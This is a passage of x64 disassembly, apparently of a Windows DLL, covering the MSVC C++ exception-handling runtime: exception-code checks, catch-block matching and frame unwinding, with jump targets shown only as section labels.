cmp edi 0xffffffff
jle r-xdata
mov r9d edi
mov r8 rsi
mov rdx r15
mov rcx r14
call sub_18001ea0c
add rsp 0x30
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp edi r13d
jle r-xdata
call sub_1800203b8
cmp edi [ rsi + 0x4 ]
jl r-xdata
call sub_1800203b8
movsxd r12 edi
call sub_18001cbc8
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
mov edi [ rcx + rax ]
mov [ rsp + 0x20 ] edi
call sub_18001cbc8
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
xor eax eax
call sub_18001cbc8
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_18001cbc8
add rax rbx
jmp r-xdata
jmp r-xdata
mov r9d edi
mov r8 rsi
mov rdx r15
mov rcx r14
call sub_18001ea0c
call sub_18001cbc8
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov [ rsp + 0x24 ] edi
jmp r-xdata
xor eax eax
call sub_18001cbc8
movsxd rcx [ rsi + 0x8 ]
lea rax [ rax + r12 * 8 ]
movsxd rbx [ rcx + rax + 0x4 ]
call sub_18001cbc8
add rax rbx
jmp r-xdata
cmp edi 0xffffffff
je r-xdata
mov r8d 0x103
mov rdx r14
mov rcx rax
call sub_180025a80
mov rcx [ rsp + 0x28 ]
call sub_18001cbf8
sub_18001f178
test rcx rcx
je r-xdata
retn
mov [ rsp + 0x10 ] dl
sub rsp 0x28
cmp [ rcx ] 0xe06d7363
jne r-xdata
add rsp 0x28
mov rax [ rcx + 0x30 ]
test rax rax
je r-xdata
cmp [ rax + 0x4 ] 0x0
je r-xdata
movsxd rax [ rax + 0x4 ]
mov rdx [ rcx + 0x38 ]
add rdx rax
mov rcx [ rcx + 0x28 ]
call rdx
jmp r-xdata
sub_18001f1e0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x20
mov rsi rdx
mov r14 rcx
test rdx rdx
jne r-xdata
xor edi edi
xor r12b r12b
cmp [ rdx ] edi
jle r-xdata
call sub_1800203b8
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov al r12b
add rsp 0x20
pop r15
pop r14
pop r13
pop r12
pop rdi
retn
call sub_18001cbe0
mov r11 rax
mov rax [ r14 + 0x30 ]
movsxd rcx [ rax + 0xc ]
lea r13 [ r11 + rcx + 0x4 ]
call sub_18001cbe0
mov r11 rax
mov rax [ r14 + 0x30 ]
movsxd rcx [ rax + 0xc ]
mov ebp [ r11 + rcx ]
test ebp ebp
jle r-xdata
inc edi
cmp edi [ rsi ]
jl r-xdata
movsxd rax edi
lea r15 [ rax + rax * 4 ]
mov r12b 0x1
dec ebp
add r13 0x4
test ebp ebp
jg r-xdata
call sub_18001cbe0
mov rbx rax
movsxd rax [ r13 ]
add rbx rax
call sub_18001cbc8
movsxd rcx [ rsi + 0x4 ]
mov r8 [ r14 + 0x30 ]
lea rax [ rax + r15 * 4 ]
mov rdx rbx
add rcx rax
call sub_18001ee74
test eax eax
jne r-xdata
jmp r-xdata
sub_18001f2b4
push rbx
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x80
mov rdi rcx
xor r13d r13d
mov [ rsp + 0x20 ] r13d
and [ rsp + 0xc0 ] r13d
and [ rsp + 0x48 ] r13
and [ rsp + 0x40 ] r13
call sub_18001ec0c
mov rax [ rax + 0xf8 ]
mov [ rsp + 0xd8 ] rax
call sub_18001ec0c
mov rax [ rax + 0xf0 ]
mov [ rsp + 0xd0 ] rax
mov rsi [ rdi + 0x50 ]
mov [ rsp + 0xc8 ] rsi
mov rax [ rdi + 0x48 ]
mov [ rsp + 0x38 ] rax
mov rbx [ rdi + 0x40 ]
mov r15 [ rdi + 0x30 ]
mov r12 [ rdi + 0x28 ]
mov [ rsp + 0x60 ] r12
call sub_18001ec0c
mov [ rax + 0xf0 ] rsi
call sub_18001ec0c
mov [ rax + 0xf8 ] rbx
call sub_18001ec0c
mov rdx [ rax + 0xf0 ]
mov rdx [ rdx + 0x28 ]
lea rcx [ rsp + 0x70 ]
call sub_18001cf88
mov r14 rax
mov [ rsp + 0x50 ] rax
cmp [ rdi + 0x58 ] r13
je r-xdata
mov r8d 0x100
mov rdx r12
mov rcx r15
call sub_180025a80
mov rbx rax
mov [ rsp + 0x48 ] rax
mov rdi [ rsp + 0xd8 ]
mov r15 [ rsp + 0xd0 ]
jmp r-xdata
mov [ rsp + 0xc0 ] 0x1
call sub_18001ec0c
mov rcx [ rax + 0x138 ]
mov [ rsp + 0x40 ] rcx
mov rcx r14
call sub_18001d000
test r13d r13d
jne r-xdata
call sub_18001ec0c
mov [ rax + 0xf0 ] r15
call sub_18001ec0c
mov [ rax + 0xf8 ] rdi
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r12 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp [ rsi ] 0xe06d7363
jne r-xdata
cmp [ rsi + 0x18 ] 0x4
jne r-xdata
cmp [ rsi + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rsi + 0x28 ]
call sub_18001cfcc
test eax eax
je r-xdata
cmp [ rsi + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rsi
call sub_18001f178
cmp [ rsi + 0x20 ] 0x19930522
jne r-xdata
sub_18001f3b9
mov [ rsp + 0x20 ] 0x1
call sub_18001ec0c
and [ rax + 0x2c0 ] 0x0
mov rsi [ rsp + 0xc8 ]
cmp [ rsp + 0xc0 ] 0x0
je r-xdata
lea r9 [ rsi + 0x20 ]
mov r8d [ rsi + 0x18 ]
mov edx [ rsi + 0x4 ]
mov ecx [ rsi ]
mov dl 0x1
mov rcx rsi
call sub_18001f178
mov r11 [ rsp + 0x40 ]
lea r9 [ r11 + 0x20 ]
mov r8d [ r11 + 0x18 ]
mov edx [ r11 + 0x4 ]
mov ecx [ r11 ]
jmp r-xdata
call sub_18001ec0c
mov [ rax + 0xf0 ] r15
call sub_18001ec0c
mov [ rax + 0xf8 ] rdi
mov rax [ rsp + 0x38 ]
movsxd rcx [ rax + 0x1c ]
mov rax [ r12 ]
mov [ rcx + rax ] 0xfffffffffffffffe
mov rax rbx
add rsp 0x80
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
cmp [ rsi ] 0xe06d7363
jne r-xdata
call [ RaiseException@IAT ]
mov r13d [ rsp + 0x20 ]
mov rbx [ rsp + 0x48 ]
mov rdi [ rsp + 0xd8 ]
mov r15 [ rsp + 0xd0 ]
mov r12 [ rsp + 0x60 ]
mov r14 [ rsp + 0x50 ]
mov rcx r14
call sub_18001d000
test r13d r13d
jne r-xdata
cmp [ rsi + 0x18 ] 0x4
jne r-xdata
cmp [ rsi + 0x20 ] 0x19930520
je r-xdata
mov rcx [ rsi + 0x28 ]
call sub_18001cfcc
test eax eax
je r-xdata
cmp [ rsi + 0x20 ] 0x19930521
je r-xdata
mov dl 0x1
mov rcx rsi
call sub_18001f178
cmp [ rsi + 0x20 ] 0x19930522
jne r-xdata
sub_18001f4c8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
push r13
push r14
sub rsp 0x30
mov rsi r9
mov rdi r8
mov r12 rdx
mov r14 rcx
xor ebx ebx
mov r13d [ r8 + 0x4 ]
test r13d r13d
je r-xdata
mov r11 rbx
movsxd r13 r13d
call sub_18001cbc8
lea r11 [ r13 + rax ]
jmp r-xdata
xor eax eax
test r13d r13d
je r-xdata
test r11 r11
je r-xdata
mov r11 rbx
call sub_18001cbc8
mov r11 rax
movsxd rax [ rdi + 0x4 ]
add r11 rax
jmp r-xdata
cmp [ rdi + 0x8 ] ebx
jne r-xdata
cmp [ r11 + 0x10 ] bl
je r-xdata
mov ecx [ rdi ]
test ecx ecx
js r-xdata
test [ rdi ] 0x80000000
je r-xdata
mov edi 0x1
test cl 0x8
je r-xdata
movsxd rax [ rdi + 0x8 ]
add rax [ r12 ]
mov r12 rax
test [ rsi ] dil
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_180025ac8
test eax eax
je r-xdata
cmp [ rsi + 0x18 ] ebx
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
call sub_180025ac8
test eax eax
je r-xdata
call sub_1800203b8
mov edx edi
mov rcx r12
call sub_180025ac8
test eax eax
je r-xdata
mov r11 rbx
call sub_18001cbe0
mov r11 rax
movsxd rax [ rsi + 0x18 ]
add r11 rax
jmp r-xdata
mov edx edi
mov rcx r12
call sub_180025ac8
test eax eax
je r-xdata
mov rcx [ r14 + 0x28 ]
mov [ r12 ] rcx
call sub_180025ac8
test eax eax
je r-xdata
call sub_180025ac8
test eax eax
je r-xdata
mov edx edi
mov rcx [ r14 + 0x28 ]
test r11 r11
jne r-xdata
movsxd r8 [ rsi + 0x14 ]
mov rdx [ r14 + 0x28 ]
mov rcx r12
call sub_18001c4a0
cmp [ rsi + 0x14 ] 0x8
jne r-xdata
mov eax ebx
jmp r-xdata
mov edx edi
mov rcx r12
call sub_180025ac8
test eax eax
je r-xdata
mov edx edi
mov rcx r12
call sub_180025ac8
test eax eax
je r-xdata
cmp [ r12 ] rbx
je r-xdata
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x60 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
cmp [ rsi + 0x18 ] ebx
je r-xdata
movsxd r10 [ rsi + 0x14 ]
lea rdx [ rsi + 0x8 ]
mov rcx [ r14 + 0x28 ]
call sub_18001f1bc
mov rdx rax
mov r8 r10
mov rcx r12
call sub_18001c4a0
jmp r-xdata
mov rcx [ r12 ]
jmp r-xdata
mov rcx rbx
call sub_18001cbe0
mov rcx rax
movsxd rax [ rsi + 0x18 ]
add rcx rax
jmp r-xdata
lea rdx [ rsi + 0x8 ]
call sub_18001f1bc
mov [ r12 ] rax
jmp r-xdata
mov al [ rsi ]
and al 0x4
neg al
sbb ecx ecx
neg ecx
add ecx edi
mov ebx ecx
mov [ rsp + 0x20 ] ecx
jmp r-xdata
call sub_180025ac8
test eax eax
je r-xdata
sub_18001f6cc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rbx r9
mov rsi rcx
test [ r8 ] 0x80000000
je r-xdata
movsxd rdi [ r8 + 0x8 ]
add rdi [ rdx ]
mov rdi rdx
jmp r-xdata
xor r10d r10d
cmp [ rbx + 0x18 ] r10d
je r-xdata
dec eax
jne r-xdata
call sub_18001f4c8
dec eax
je r-xdata
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_18001f1bc
mov rdx rax
mov rcx rdi
call r10
call sub_18001cbe0
movsxd r10 [ rbx + 0x18 ]
add r10 rax
jmp r-xdata
xor r10d r10d
cmp [ rbx + 0x18 ] r10d
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
lea rdx [ rbx + 0x8 ]
mov rcx [ rsi + 0x28 ]
call sub_18001f1bc
mov rdx rax
mov r8d 0x1
mov rcx rdi
call r10
jmp r-xdata
call sub_18001cbe0
mov r10 rax
movsxd rax [ rbx + 0x18 ]
add r10 rax
sub_18001f77c
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x18 ] rbp
push rsi
push rdi
push r12
push r13
push r14
sub rsp 0x50
mov r13 [ rsp + 0xa0 ]
mov rbp r9
mov r12 rdx
mov r14 r8
mov rbx rcx
lea r9 [ rax + 0x10 ]
mov r8 r13
mov rdx rbp
mov rcx r12
call sub_18001cadc
mov r9 [ rsp + 0xb0 ]
mov rsi [ rsp + 0xa8 ]
mov rdi rax
test r9 r9
je r-xdata
call sub_18001cbc8
movsxd rcx [ rsi + 0xc ]
mov r9 rdi
add rax rcx
mov cl [ rsp + 0xc0 ]
mov r8 r14
mov [ rsp + 0x40 ] cl
mov rcx [ rsp + 0xb8 ]
mov [ rsp + 0x38 ] rbp
mov edx [ rcx ]
mov [ rsp + 0x30 ] r13
mov rcx r12
mov [ rsp + 0x28 ] edx
mov rdx rbx
mov [ rsp + 0x20 ] rax
call sub_18001d060
lea r11 [ rsp + 0x50 ]
mov rbx [ r11 + 0x30 ]
mov rbp [ r11 + 0x40 ]
mov rsp r11
pop r14
pop r13
pop r12
pop rdi
pop rsi
retn
mov r8 rsi
mov rdx rax
mov rcx rbx
call sub_18001f6cc
sub_18001f840
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] r8
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x60
cmp [ rcx ] 0x80000003
mov r14 r9
mov r12 r8
mov r15 rdx
mov rsi rcx
je r-xdata
mov rbx [ rsp + 0xa8 ]
add rsp 0x60
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call sub_18001ec0c
mov edi [ rsp + 0xd0 ]
mov rbp [ rsp + 0xc0 ]
cmp [ rax + 0xe0 ] 0x0
je r-xdata
cmp [ rbp + 0xc ] 0x0
jne r-xdata
call sub_18001ec0c
mov rbx rax
call EncodePointer
cmp [ rbx + 0xe0 ] rax
je r-xdata
mov r12d [ rsp + 0xc8 ]
lea rax [ rsp + 0x50 ]
mov [ rsp + 0x30 ] r14
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0xa0 ]
mov r8d edi
mov r9d r12d
mov rdx rbp
mov rcx r15
mov [ rsp + 0x20 ] rax
call sub_18001ce5c
mov ecx [ rsp + 0xa0 ]
cmp ecx [ rsp + 0x50 ]
jae r-xdata
call sub_1800203b8
cmp [ rsi ] 0xe0434f4d
je r-xdata
lea rdi [ rax + 0xc ]
cmp [ rsi ] 0xe0434352
je r-xdata
inc ecx
add rdi 0x14
mov [ rsp + 0xa0 ] ecx
cmp ecx [ rsp + 0x50 ]
jb r-xdata
cmp r12d [ rdi - 0x8 ]
jg r-xdata
mov rax [ rsp + 0xd8 ]
mov r9 r14
mov r8 r12
mov [ rsp + 0x30 ] rax
mov rdx r15
mov rcx rsi
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rbp
call sub_18001ce08
test eax eax
jne r-xdata
lea r13 [ rdi - 0xc ]
cmp r12d [ r13 ]
jl r-xdata
call sub_18001cbc8
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
xor eax eax
call sub_18001cbc8
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_18001cbc8
add rax rbx
jmp r-xdata
call sub_18001cbc8
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
test [ rax + rdx - 0x14 ] 0x40
jne r-xdata
call sub_18001cbc8
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
cmp [ rax + rdx - 0x10 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov ecx [ rsp + 0xa0 ]
call sub_18001cbc8
mov ecx [ rdi ]
mov r8 [ rsp + 0xb0 ]
dec ecx
mov [ rsp + 0x40 ] 0x0
mov [ rsp + 0x38 ] r13
and [ rsp + 0x30 ] 0x0
movsxd rcx ecx
mov r9 r14
lea rdx [ rcx + rcx * 4 ]
lea rcx [ rax + rdx * 4 ]
movsxd rax [ rdi + 0x4 ]
mov rdx r15
add rcx rax
mov [ rsp + 0x28 ] rcx
mov rcx rsi
mov [ rsp + 0x20 ] rbp
call sub_18001f77c
xor eax eax
call sub_18001cbc8
movsxd rcx [ rdi ]
lea rdx [ rcx + rcx * 4 ]
movsxd rcx [ rdi + 0x4 ]
lea rdx [ rcx + rdx * 4 ]
movsxd rbx [ rax + rdx - 0x10 ]
call sub_18001cbc8
add rax rbx
jmp r-xdata
cmp [ rax + 0x10 ] 0x0
jne r-xdata
sub_18001fa78
mov rax rsp
mov [ rax + 0x20 ] rbx
mov [ rax + 0x18 ] r8
mov [ rax + 0x10 ] rdx
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rax - 0x3f ]
sub rsp 0x90
mov rbx [ rbp + 0x67 ]
mov r13 rdx
mov rdi rcx
xor r14b r14b
mov rdx r9
mov rcx rbx
mov r15 r9
mov r12 r8
mov [ rbp + 0x47 ] r14b
call sub_18001e9dc
lea r9 [ rbp - 0x21 ]
mov r8 rbx
mov rdx r15
mov rcx r13
mov esi eax
call sub_18001cadc
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_18001ea54
mov r8 rbx
mov rdx r15
cmp esi eax
jle r-xdata
mov rcx r13
call sub_18001ea54
mov esi eax
lea rcx [ rbp - 0x21 ]
mov r9d esi
call sub_18001ea0c
mov r9d esi
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_18001ea18
jmp r-xdata
call sub_1800203b8
cmp esi [ rbx + 0x4 ]
jl r-xdata
cmp esi 0xffffffff
jl r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
cmp [ rbx + 0xc ] 0x0
jbe r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
call sub_18001ec0c
cmp [ rax + 0x108 ] 0x0
je r-xdata
cmp [ rbp + 0x6f ] 0x0
jne r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
mov rbx [ rsp + 0xe8 ]
add rsp 0x90
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
call sub_1800203b8
call sub_180020394
mov rax [ rbp + 0x7f ]
mov r9 r15
mov r8 r12
mov [ rsp + 0x38 ] rax
mov eax [ rbp + 0x77 ]
mov rdx r13
mov [ rsp + 0x30 ] eax
mov rcx rdi
mov [ rsp + 0x28 ] esi
mov [ rsp + 0x20 ] rbx
call sub_18001f840
jmp r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
cmp [ rdi + 0x30 ] 0x0
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
call sub_18001ec0c
cmp [ rax + 0xf0 ] 0x0
je r-xdata
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
cmp [ rbx + 0xc ] 0x0
jbe r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
call sub_18001ec0c
mov rdi [ rax + 0xf0 ]
call sub_18001ec0c
mov rcx [ rdi + 0x38 ]
mov r12 [ rax + 0xf8 ]
mov [ rbp + 0x57 ] r12
call sub_18001cc14
mov edx 0x1
mov rcx rdi
call sub_180025ac8
test eax eax
jne r-xdata
mov eax [ rbx ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
mov r8d [ rbp + 0x77 ]
lea rax [ rbp - 0x31 ]
mov [ rsp + 0x30 ] r15
mov [ rsp + 0x28 ] rax
lea rax [ rbp - 0x39 ]
mov r9d esi
mov rdx rbx
mov rcx r13
mov [ rsp + 0x20 ] rax
call sub_18001ce5c
mov ecx [ rbp - 0x39 ]
mov edx [ rbp - 0x31 ]
cmp ecx edx
jae r-xdata
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
cmp [ rdi ] 0xe06d7363
jne r-xdata
call sub_1800203b8
mov esi [ rbx + 0x20 ]
test esi esi
je r-xdata
lea r12 [ rax + 0x10 ]
call sub_18001ec0c
cmp [ rax + 0x108 ] 0x0
je r-xdata
cmp [ rdi + 0x18 ] 0x4
jne r-xdata
xor eax eax
movsxd rsi esi
call sub_18001cbc8
add rax rsi
jmp r-xdata
inc ecx
add r12 0x14
mov [ rbp - 0x39 ] ecx
cmp ecx edx
jb r-xdata
cmp esi [ r12 - 0xc ]
jg r-xdata
call sub_18001ec0c
mov r12 [ rax + 0x108 ]
call sub_18001ec0c
mov rdx r12
and [ rax + 0x108 ] 0x0
mov rcx rdi
call sub_18001f1e0
test al al
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930520
je r-xdata
test esi esi
je r-xdata
test rax rax
je r-xdata
cmp [ r12 - 0x10 ] esi
jg r-xdata
test r14b r14b
jne r-xdata
call sub_18001cbc8
movsxd r13 [ r12 ]
mov r14d [ r12 - 0x4 ]
add r13 rax
mov r12 [ rbp + 0x57 ]
xor r13d r13d
cmp [ r12 ] r13d
jle r-xdata
cmp [ rdi + 0x30 ] 0x0
jne r-xdata
cmp [ rdi + 0x20 ] 0x19930521
je r-xdata
xor edx edx
call sub_18001cbc8
mov rdx rax
movsxd rax [ rbx + 0x20 ]
add rdx rax
jmp r-xdata
mov r14b [ rbp + 0x47 ]
mov r13 [ rbp + 0x4f ]
call sub_18001cbe0
mov rcx [ rdi + 0x30 ]
movsxd rdx [ rcx + 0xc ]
lea rax [ rax + rdx + 0x4 ]
mov [ rbp - 0x29 ] rax
call sub_18001cbe0
mov rcx [ rdi + 0x30 ]
movsxd rdx [ rcx + 0xc ]
mov ecx [ rax + rdx ]
mov [ rbp - 0x35 ] ecx
test ecx ecx
jle r-xdata
call sub_180020394
xor esi esi
call sub_1800203b8
cmp [ rdi + 0x20 ] 0x19930522
jne r-xdata
lea r9 [ rbp + 0x47 ]
mov r8 rbx
mov rdx r15
mov rcx r13
call sub_18001cadc
mov cl [ rbp + 0x6f ]
mov r8 [ rbp + 0x57 ]
mov [ rsp + 0x40 ] cl
mov [ rsp + 0x38 ] r15
mov [ rsp + 0x30 ] rbx
or [ rsp + 0x28 ] 0xffffffff
and [ rsp + 0x20 ] 0x0
mov r9 rax
mov rdx rdi
mov rcx r13
call sub_18001d060
mov rcx rdi
call sub_18001f1e0
test al al
jne r-xdata
dec r14d
add r13 0x14
jmp r-xdata
call sub_18001cbe0
mov rcx [ rbp - 0x29 ]
mov r8 [ rdi + 0x30 ]
movsxd rcx [ rcx ]
add rax rcx
mov rcx r13
mov rdx rax
mov [ rbp - 0x19 ] rax
call sub_18001ee74
test eax eax
jne r-xdata
xor eax eax
call sub_18001cbc8
movsxd rcx [ r12 + 0x4 ]
add rax rsi
movsxd rbx [ rcx + rax + 0x4 ]
call sub_18001cbc8
add rax rbx
jmp r-xdata
test r14d r14d
jle r-xdata
mov al [ rbp + 0x6f ]
mov r8 [ rbp + 0x57 ]
mov r14b 0x1
mov [ rsp + 0x40 ] al
lea rax [ r12 - 0x10 ]
mov r9 r15
mov [ rsp + 0x38 ] rax
mov rax [ rbp - 0x19 ]
mov rcx rdi
mov [ rsp + 0x30 ] rax
mov [ rsp + 0x28 ] r13
mov r13 [ rbp + 0x4f ]
mov rdx r13
mov [ rbp + 0x47 ] r14b
mov [ rsp + 0x20 ] rbx
call sub_18001f77c
jmp r-xdata
mov eax [ rbp - 0x35 ]
add [ rbp - 0x29 ] 0x4
dec eax
mov [ rbp - 0x35 ] eax
test eax eax
jg r-xdata
mov dl 0x1
mov rcx rdi
call sub_18001f178
lea r11 [ r--data ]
lea rdx [ rbp + 0x47 ]
lea rcx [ rbp - 0x11 ]
mov [ rbp + 0x47 ] r11
call sub_18001c398
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x11 ]
mov [ rbp - 0x11 ] r11
call sub_18001c8f0
int3
inc r13d
add rsi 0x14
cmp r13d [ r12 ]
jl r-xdata
lea rdx [ rw-data ]
mov rcx rax
call sub_18001c9c0
test al al
jne r-xdata
mov edx [ rbp - 0x31 ]
mov ecx [ rbp - 0x39 ]
call sub_18001cbc8
movsxd rcx [ r12 + 0x4 ]
add rax rsi
cmp [ rcx + rax + 0x4 ] 0x0
je r-xdata
sub_18001ff6c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r14
sub rsp 0x40
mov rbp r9
mov r12 r8
mov rsi rdx
mov rbx rcx
call sub_18001ec0c
mov rdi [ rsp + 0x80 ]
cmp [ rax + 0x2c0 ] 0x0
mov edx 0x1fffffff
mov r8d 0x80000029
mov r9d 0x80000026
mov r14d 0x1
jne r-xdata
mov eax [ rbx + 0x4 ]
test al 0x66
je r-xdata
cmp [ rbx ] 0xe06d7363
je r-xdata
cmp [ rdi + 0xc ] 0x0
jne r-xdata
cmp [ rdi + 0x4 ] 0x0
je r-xdata
cmp [ rbx ] r8d
jne r-xdata
cmp [ rbx ] 0xe06d7363
jne r-xdata
mov eax [ rdi ]
and eax edx
cmp eax 0x19930521
jb r-xdata
mov eax r14d
cmp [ rsp + 0x88 ] 0x0
jne r-xdata
cmp [ rbx ] r9d
je r-xdata
cmp [ rbx + 0x18 ] 0xf
jne r-xdata
mov rax [ rsp + 0x90 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] rax
mov eax [ rsp + 0x88 ]
mov rdx rsi
mov [ rsp + 0x30 ] eax
mov al [ rsp + 0x98 ]
mov rcx rbx
mov [ rsp + 0x28 ] al
mov [ rsp + 0x20 ] rdi
call sub_18001fa78
cmp [ rbx + 0x18 ] 0x3
jb r-xdata
cmp [ rdi + 0x20 ] 0x0
je r-xdata
and eax 0x20
je r-xdata
mov ecx [ rdi ]
and ecx edx
cmp ecx 0x19930522
jb r-xdata
cmp [ rbx + 0x60 ] 0x19930520
je r-xdata
cmp [ rbx + 0x20 ] 0x19930522
jbe r-xdata
xor eax eax
call sub_18001cbc8
movsxd rcx [ rdi + 0x20 ]
add rax rcx
jmp r-xdata
test eax eax
je r-xdata
cmp [ rbx ] r9d
jne r-xdata
test [ rdi + 0x24 ] r14b
jne r-xdata
mov rax [ rbx + 0x30 ]
cmp [ rax + 0x8 ] 0x0
je r-xdata
test rax rax
je r-xdata
mov r8 rdi
mov rdx rbp
mov rcx rsi
call sub_18001cc30
jmp r-xdata
cmp [ rbx ] r8d
jne r-xdata
mov r8 [ r12 + 0xf8 ]
mov rdx rbp
mov rcx rdi
call sub_18001e950
mov ebx eax
cmp eax 0xffffffff
jl r-xdata
xor r11d r11d
call sub_18001cbe0
mov rcx [ rbx + 0x30 ]
movsxd r11 [ rcx + 0x8 ]
add r11 rax
jmp r-xdata
mov esi [ rbx + 0x38 ]
cmp esi 0xffffffff
jl r-xdata
call sub_1800203b8
cmp eax [ rdi + 0x4 ]
jl r-xdata
movzx eax [ rsp + 0x98 ]
mov r9 rbp
mov r8 r12
mov [ rsp + 0x38 ] eax
mov rax [ rsp + 0x90 ]
mov rdx rsi
mov [ rsp + 0x30 ] rax
mov eax [ rsp + 0x88 ]
mov rcx rbx
mov [ rsp + 0x28 ] eax
mov [ rsp + 0x20 ] rdi
call r11
jmp r-xdata
test r11 r11
je r-xdata
call sub_1800203b8
cmp esi [ rdi + 0x4 ]
jl r-xdata
mov r9d ebx
mov rcx rsi
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x40
pop r14
pop r12
pop rdi
retn
mov rcx [ rbx + 0x28 ]
mov r9d esi
jmp r-xdata
mov rdx rbp
mov r8 rdi
call sub_18001efec
jmp r-xdata
sub_180020194
mov r11 rsp
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x18 ] rbp
mov [ r11 + 0x20 ] rsi
mov [ r11 + 0x10 ] rdx
push rdi
push r12
push r13
push r14
push r15
sub rsp 0x40
mov r15 [ r9 + 0x8 ]
mov r14 [ r9 ]
mov eax [ rcx + 0x4 ]
mov rdi [ r9 + 0x38 ]
sub r14 r15
mov r12 r9
mov r13 rdx
mov rbp rcx
test al 0x66
jne r-xdata
mov r8 [ r9 + 0x20 ]
xor ebp ebp
xor r13d r13d
sub r8 r15
test al 0x20
je r-xdata
movsxd rsi [ r9 + 0x48 ]
mov [ r11 - 0x38 ] rcx
mov [ r11 - 0x30 ] r8
mov rax rsi
cmp esi [ rdi ]
jae r-xdata
movsxd rsi [ r9 + 0x48 ]
mov rbx rsi
cmp esi [ rdi ]
jae r-xdata
xor edx edx
cmp [ rdi ] edx
jbe r-xdata
mov eax 0x1
add rax rax
lea rbx [ rdi + rax * 8 + 0xc ]
inc rbx
shl rbx 0x4
add rbx rdi
lea rcx [ rdi + 0x8 ]
inc esi
add rbx 0x10
cmp esi [ rdi ]
jae r-xdata
mov eax [ rbx - 0x4 ]
cmp r14 rax
jae r-xdata
inc esi
add rbx 0x10
cmp esi [ rdi ]
jb r-xdata
mov eax [ rbx - 0x8 ]
cmp r14 rax
jae r-xdata
inc edx
add rcx 0x10
cmp edx [ rdi ]
jae r-xdata
mov eax [ rcx ]
cmp r8 rax
jbe r-xdata
jmp r-xdata
cmp [ rbx + 0x4 ] 0x0
je r-xdata
mov eax [ rbx - 0xc ]
cmp r14 rax
jb r-xdata
test r13d r13d
je r-xdata
jmp r-xdata
mov eax edx
add rax rax
mov ecx [ rdi + rax * 8 + 0x10 ]
test ecx ecx
jne r-xdata
mov eax [ rbx - 0x8 ]
